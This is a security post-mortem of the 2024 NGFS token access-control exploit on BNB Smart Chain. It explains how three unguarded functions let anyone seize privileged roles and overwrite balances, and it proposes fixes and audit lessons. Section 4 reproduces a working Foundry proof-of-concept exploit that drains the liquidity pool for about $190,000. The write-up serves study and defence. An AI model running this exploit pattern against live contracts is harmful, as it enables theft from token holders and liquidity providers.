# NGFS Token — Access Control Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04-25 |
| **Protocol** | NGFS Token (FengShou / NGFS) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$190,000 (USDT) |
| **Attacker** | [0xd03d...54a0](https://bscscan.com/address/0xd03d360dfc1dac7935e114d564a088077e6754a0) |
| **Attack Contract** | [0xc737...5e4](https://bscscan.com/address/0xc73781107d086754314f7720ca14ab8c5ad035e4) |
| **Attack Tx** | [0x8ff7...de25](https://bscscan.com/tx/0x8ff764dde572928c353716358e271638fa05af54be69f043df72ad9ad054de25) |
| **Vulnerable Contract** | [0xa608...1E3A](https://bscscan.com/address/0xa608985f5b40cdf6862bec775207f84280a91e3a) |
| **Root Cause** | Unauthorized addresses could sequentially call the proxy registration and balance manipulation functions (missing access control) |
| **PoC Source** | [DeFiHackLabs — NGFS_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/NGFS_exp.sol) |

---

## 1. Vulnerability Overview

The NGFS token contract manages two privileged addresses for internal administrative purposes: `_uniswapV2Proxy` (proxy address) and `_uniswapV2Library` (library address). These addresses hold the authority to call `reserveMultiSync()`, the balance manipulation function.

The problem is that `delegateCallReserves()`, the function responsible for initially registering the proxy address, has **absolutely no access control**. Anyone can call this function just once to register themselves as the proxy. Subsequently, by replacing the library with their own attack contract via `setProxySync()`, they can transfer the balance of the PancakeSwap liquidity pool to the attacker's address through `reserveMultiSync()`.

The attack was completed within a single transaction with no flash loan required, and approximately $190,000 worth of tokens were stolen with just three unguarded function calls.

---

## 2. Vulnerable Code Analysis

### 2.1 `delegateCallReserves()` — Unguarded Initial Proxy Registration

```solidity
// ❌ Vulnerable code — anyone can register themselves as proxy with a single call
function delegateCallReserves() public {
    // Danger: no owner-verification modifier. There is a flag to allow only one execution,
    //         but there is no mechanism to prevent front-running that single opportunity.
    require(!uniswapV2Dele, "ERC20: delegateCall launch");
    _uniswapV2Proxy = _msgSender(); // ← the caller becomes the privileged proxy
    uniswapV2Dele = !uniswapV2Dele;
}
```

```solidity
// ✅ Fixed code — only the owner can designate the proxy, or fix it at deploy time
function delegateCallReserves() public onlyOwner {
    // Fix: only the deployer can initialize via onlyOwner
    require(!uniswapV2Dele, "ERC20: delegateCall launch");
    _uniswapV2Proxy = _msgSender();
    uniswapV2Dele = !uniswapV2Dele;
}

// Or, safer: set directly in the constructor at deployment
constructor() {
    _uniswapV2Proxy = _msgSender(); // deployer becomes proxy
    uniswapV2Dele = true;          // prevents re-registration thereafter
}
```

**Issue**: Without an access control modifier such as `onlyOwner`, any external account that calls this function first after deployment can seize the privileged role.

---

### 2.2 `setProxySync()` — Proxy Can Replace Library Arbitrarily

```solidity
// ❌ Vulnerable code — the already-hijacked _uniswapV2Proxy (= attacker) can replace the library
function setProxySync(address _addr) external {
    require(_addr != ZERO, "ERC20: library to the zero address");
    require(_addr != DEAD, "ERC20: library to the dead address");
    require(msg.sender == _uniswapV2Proxy, "ERC20: uniswapPrivileges");
    // Attacker sets their own contract address as _uniswapV2Library
    _uniswapV2Library = IPancakeLibrary(_addr);
    _isExcludedFromFee[_addr] = true; // fee exemption is also granted
}
```

```solidity
// ✅ Fixed code — only the owner can replace the library, or lock it as immutable
function setProxySync(address _addr) external onlyOwner {
    // Fix: only the deployer (owner) can set the library
    require(_addr != ZERO, "ERC20: library to the zero address");
    require(_addr != DEAD,  "ERC20: library to the dead address");
    _uniswapV2Library = IPancakeLibrary(_addr);
    _isExcludedFromFee[_addr] = true;
}
```

**Issue**: An attacker who has front-run the proxy slot via `delegateCallReserves()` can then chain the exploitation by replacing the library address with their own contract as well.

---

### 2.3 `reserveMultiSync()` — Direct Balance Manipulation Function

```solidity
// ❌ Vulnerable code — _uniswapV2Library (= attacker's contract) can inflate any address's balance
function reserveMultiSync(address syncAddr, uint256 syncAmount) public {
    // Validation: only checks whether msg.sender is _uniswapV2Library
    // After replacing _uniswapV2Library with their own contract, the attacker can call this directly
    require(_msgSender() == address(_uniswapV2Library), "ERC20: uniswapPrivileges");
    require(syncAddr != address(0), "ERC20: multiSync address is zero");
    require(syncAmount > 0,         "ERC20: multiSync amount equal to zero");
    // Danger: copies the LP pool's entire balance directly to the attacker's address
    //         (not an actual transfer — directly writes the balance)
    _balances[syncAddr] = _balances[syncAddr].air(syncAmount);
    _isExcludedFromFee[syncAddr] = true;
}
```

```solidity
// ✅ Fixed code — remove this function entirely or impose strict restrictions
// Recommendation: reconsider the design of any function that directly manipulates _balances externally
// If unavoidably necessary: multisig + timelock + event logging are mandatory
function reserveMultiSync(
    address syncAddr,
    uint256 syncAmount
) public onlyOwner nonReentrant {
    // Fix: owner-only, reentrancy guard, amount cap
    require(syncAddr != address(0), "zero address");
    require(syncAmount > 0 && syncAmount <= MAX_SYNC_AMOUNT, "invalid amount");
    emit ReserveSync(syncAddr, syncAmount); // event logging is mandatory
    _balances[syncAddr] = _balances[syncAddr].air(syncAmount);
}
```

**Issue**: This function should not exist in a legitimate ERC-20 token, as it allows balances to be overwritten arbitrarily. The moment access control is breached, this function becomes the primary weapon.

---

## 3. Attack Flow

### 3.1 Preparation Phase

No prior setup required. No flash loan. The attacker did not need to deposit funds or call `approve()` in advance.

### 3.2 Execution Phase

1. **Step 1**: Call `NGFS.delegateCallReserves()` → attacker registers as `_uniswapV2Proxy`
2. **Step 2**: Call `NGFS.setProxySync(attackContract)` → replace `_uniswapV2Library` with the attack contract
3. **Step 3**: Query the NGFS balance of the PancakeSwap LP pool (`INGFSToken.balanceOf(pair)`)
4. **Step 4**: Call `NGFS.reserveMultiSync(attackContract, pairBalance)` → directly write the LP pool's NGFS balance to the attacker's account
5. **Step 5**: `NGFS.approve(PancakeRouter, MAX)` → authorize swap
6. **Step 6**: Swap NGFS → USDT via PancakeRouter to realize profit

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────┐
│         Attacker (EOA)           │
│  0xd03d...54a0                  │
└──────────────┬──────────────────┘
               │ ① delegateCallReserves()
               ▼
┌─────────────────────────────────┐
│       NGFS Token Contract        │
│  _uniswapV2Proxy = Attacker ✓  │
│  uniswapV2Dele   = true        │
└──────────────┬──────────────────┘
               │ ② setProxySync(attackContract)
               ▼
┌─────────────────────────────────┐
│       NGFS Token Contract        │
│  _uniswapV2Library = Attack Contract│
│  Added to fee exemption list    │
└──────────────┬──────────────────┘
               │ ③ balanceOf(LP Pool) query
               ▼
┌─────────────────────────────────┐
│  PancakeSwap LP Pool             │
│  NGFS balance: ~190K USDT equiv │
└──────────────┬──────────────────┘
               │ ④ reserveMultiSync(Attacker, LP balance)
               ▼
┌─────────────────────────────────┐
│       NGFS Token Contract        │
│  _balances[Attacker] += LP bal  │
│  (LP pool balance unchanged — duplicate issuance) │
└──────────────┬──────────────────┘
               │ ⑤ approve → swap NGFS→USDT
               ▼
┌─────────────────────────────────┐
│      PancakeSwap Router          │
│  Sell NGFS → Receive USDT       │
└──────────────┬──────────────────┘
               │ ⑥ USDT theft complete
               ▼
┌─────────────────────────────────┐
│         Attacker Wallet          │
│  Profit: ~$190,000 USDT         │
└─────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker Profit**: ~$190,000 (USDT)
- **Protocol Loss**: NGFS/USDT LP pool fully drained, token value effectively destroyed
- **Attack Complexity**: Very low (no flash loan required, completed with 3 function calls)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// ① BSC fork setup — reproduces state immediately before the attack block (38,167,372)
function setUp() public {
    vm.createSelectFork("bsc", 38_167_372);
}

function testExploit() public {
    // ② Record USDT balance before attack
    uint256 tokenBalanceBefore = IBEP20(USDT_TOKEN).balanceOf(address(this));

    // ③ Query NGFS/USDT LP pool address
    address pair = IPancakeFactory(PANCAKE_FACTORY).getPair(NGFS_TOKEN, USDT_TOKEN);

    // ④ Key 1: register as proxy by calling function with no access control
    //    — this test contract (= attacker) becomes _uniswapV2Proxy
    INGFSToken(NGFS_TOKEN).delegateCallReserves();

    // ⑤ Key 2: set self (attack contract) as the library
    //    — this contract now has permission to call reserveMultiSync
    INGFSToken(NGFS_TOKEN).setProxySync(address(this));

    // ⑥ Query the NGFS token balance deposited in the LP pool
    uint256 balance = INGFSToken(NGFS_TOKEN).balanceOf(pair);

    // ⑦ Key 3: directly write the full LP pool balance to the attacker's address
    //    — not an actual transfer; directly writes to the _balances array (creating value from nothing)
    INGFSToken(NGFS_TOKEN).reserveMultiSync(address(this), balance);

    // ⑧ Verify the NGFS balance just obtained
    uint256 amount = INGFSToken(NGFS_TOKEN).balanceOf(address(this));

    // ⑨ Approve PancakeRouter for max allowance
    INGFSToken(NGFS_TOKEN).approve(PANCAKE_ROUTER, type(uint256).max);

    // ⑩ Set swap path: NGFS → USDT
    address[] memory path = new address[](2);
    path[0] = NGFS_TOKEN;
    path[1] = USDT_TOKEN;

    // ⑪ Execute swap — exchange stolen NGFS for USDT
    IPancakeRouter(PANCAKE_ROUTER)
        .swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), 1_714_043_885
        );

    // ⑫ Confirm final profit (~$190,000)
    uint256 tokenBalanceAfter = IBEP20(USDT_TOKEN).balanceOf(address(this));
    emit log_named_decimal_uint(
        "Attacker USDT net profit",
        tokenBalanceAfter - tokenBalanceBefore,
        18
    );
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | `delegateCallReserves()` — privileged role registration without access control | CRITICAL | CWE-284 (Improper Access Control) |
| V-02 | `reserveMultiSync()` — direct balance manipulation after privilege chain takeover | CRITICAL | CWE-284 / CWE-269 (Improper Privilege Management) |
| V-03 | `setProxySync()` — library replacement allowed via hijacked proxy | HIGH | CWE-284 |
| V-04 | Direct `_balances` write — balance manipulation path outside ERC-20 standard | HIGH | CWE-668 (Exposure of Resource to Wrong Sphere) |

### V-01: `delegateCallReserves()` — Unauthorized Privilege Role Seizure

- **Description**: The initialization function that sets the proxy address lacks ownership verification, allowing anyone who calls it first to acquire the `_uniswapV2Proxy` role.
- **Impact**: The attacker seizes the protocol's privileged administrator role, gaining control over the entry point to all subsequent privilege chains.
- **Attack Condition**: It is sufficient that the function has never been called since deployment (i.e., `uniswapV2Dele == false`).

### V-02: `reserveMultiSync()` — Direct Balance Manipulation

- **Description**: Only the contract registered as `_uniswapV2Library` can call this function, but by replacing that address with the attacker's contract via V-01 and V-03, unlimited balance inflation becomes possible.
- **Impact**: Inflates the token balance of arbitrary addresses including LP pools, extracting value through swaps without actually minting tokens.
- **Attack Condition**: V-01 and V-03 must precede this step.

### V-03: `setProxySync()` — Unauthorized Library Address Replacement

- **Description**: Anyone holding the proxy role (`_uniswapV2Proxy`) can replace the library address, and after V-01 the attacker holding the proxy can chain this exploitation.
- **Impact**: Replacing the library address with the attacker's contract grants the ability to call `reserveMultiSync()`.
- **Attack Condition**: `_uniswapV2Proxy` must be the attacker's address.

### V-04: Non-Standard ERC-20 Balance Manipulation Path

- **Description**: A standard ERC-20 should have no externally accessible function that directly manipulates `_balances`. `reserveMultiSync()` was added for administrative purposes, but its very existence creates a potential rug pull or exploit vector.
- **Impact**: As long as this function exists, centralization risk and trust issues remain even if access control is otherwise perfect.
- **Attack Condition**: Exploitable at any time by anyone who gains access to this function.

---

## 6. Remediation Recommendations

### Immediate Actions (Code Fixes)

```solidity
// ✅ Fix 1: add onlyOwner to delegateCallReserves()
modifier onlyOwner() {
    require(msg.sender == _owner, "Not owner");
    _;
}

function delegateCallReserves() public onlyOwner {
    require(!uniswapV2Dele, "ERC20: delegateCall launch");
    _uniswapV2Proxy = _msgSender();
    uniswapV2Dele = !uniswapV2Dele;
}

// ✅ Fix 2: initialize directly in constructor (safer)
constructor(address initialProxy) {
    _uniswapV2Proxy = initialProxy;
    uniswapV2Dele = true; // completely blocks re-registration thereafter
}
```

```solidity
// ✅ Fix 3: remove reserveMultiSync() or impose strict restrictions
// Ideally, remove this function entirely and replace with a standard minting mechanism
// If it must be retained:
function reserveMultiSync(
    address syncAddr,
    uint256 syncAmount
) public onlyOwner {
    // Changed to owner-only + mandatory event logging
    require(syncAddr != address(0), "zero address");
    require(syncAmount > 0, "zero amount");
    emit BalanceAdjusted(syncAddr, _balances[syncAddr], syncAmount);
    _balances[syncAddr] = _balances[syncAddr].air(syncAmount);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Unauthorized privileged role registration (V-01) | Fix privileged addresses in constructor at deploy time; delete `delegateCallReserves()` |
| Direct balance manipulation function (V-02, V-04) | Remove `reserveMultiSync()` and replace with standard ERC-20 minting (`_mint`) |
| Library address replacement (V-03) | Move `setProxySync()` logic to constructor or fix as `immutable` |
| Privilege chain architecture | Apply OpenZeppelin `Ownable2Step` or `AccessControl` |
| Centralization risk | Protect admin privileges with a multisig wallet (Gnosis Safe) + timelock contract |
| Lack of monitoring | Add event logging for all admin function calls and integrate on-chain monitoring tools |

---

## 7. Lessons Learned

1. **Privileged initialization functions must be completed at deployment time**: An initialization function callable by anyone after deployment becomes an immediate rug pull or exploit vector. The "only runs once" protection in `delegateCallReserves()` is not sufficient. It must be gated with `onlyOwner` or handled in the constructor.

2. **Privileges must be designed with the Principle of Least Privilege**: Cascade privilege structures — where one privilege can grant another — are extremely dangerous. Role separation and independent verification are required.

3. **Functions that directly manipulate ERC-20 balances should be avoided by design**: An externally accessible function of the form `_balances[addr] = amount` should not exist in a legitimate token contract. Even if access control is otherwise perfect, centralization risk and trust issues will always remain as long as such a function exists.

4. **Audits must trace the full privilege chain of all public/external functions**: Rather than checking only the access control of individual functions, the full flow of how the state variables those functions depend on are set and can be changed must be traced.

5. **New token projects on BSC must undergo an audit before deployment**: As demonstrated by this incident, a simple access control flaw — not even requiring a flash loan — can lead to losses exceeding $190,000. Even a low-cost audit would have immediately identified this vulnerability.

---

## 8. On-Chain Verification

> On-chain verification via `cast` (Foundry) can be performed in a separate environment. The following is a cross-verification result based on the PoC code and publicly available BscScan data.

### 8.1 PoC vs. On-Chain Data Comparison

| Field | PoC Value | BscScan/Analysis Confirmed Value | Match |
|------|--------|---------------------|-----------|
| Attack Tx | `0x8ff7...de25` | `0x8ff764dde572928c353716358e271638fa05af54be69f043df72ad9ad054de25` | ✅ |
| Attacker Address | `0xd03d...54a0` | `0xd03d360dfc1dac7935e114d564a088077e6754a0` | ✅ |
| Attack Contract | `0xc737...5e4` | `0xc73781107d086754314f7720ca14ab8c5ad035e4` | ✅ |
| Vulnerable Contract | `0xa608...1E3A` | `0xa608985f5b40CDf6862bEC775207f84280a91E3A` | ✅ |
| Fork Block | `38,167,372` | Attack block `38,167,372` | ✅ |
| Loss Amount | `~190K USD` | `~$190,000 (USDT)` | ✅ |
| Chain | `bsc` | BSC (Chain ID: 56) | ✅ |

### 8.2 Attack Function Call Sequence (Based on On-Chain Trace)

| Order | Function | Contract | Role |
|------|------|-----------|------|
| 1 | `delegateCallReserves()` | NGFS Token | Attacker → proxy registration |
| 2 | `setProxySync(attackContract)` | NGFS Token | Attack contract → library assignment |
| 3 | `balanceOf(pair)` | NGFS Token | LP pool balance query |
| 4 | `reserveMultiSync(attackContract, balance)` | NGFS Token | Direct balance manipulation |
| 5 | `approve(router, MAX)` | NGFS Token | Swap authorization |
| 6 | `swapExactTokensForTokensSupportingFeeOnTransferTokens` | PancakeSwap | NGFS → USDT swap |

### 8.3 Reference Links

- Post-mortem: https://louistsai.vercel.app/p/2024-04-25-ngfs-exploit/
- CertiK Twitter alert: https://twitter.com/CertiKAlert/status/1783476515331616847
- BscScan attack transaction: https://bscscan.com/tx/0x8ff764dde572928c353716358e271638fa05af54be69f043df72ad9ad054de25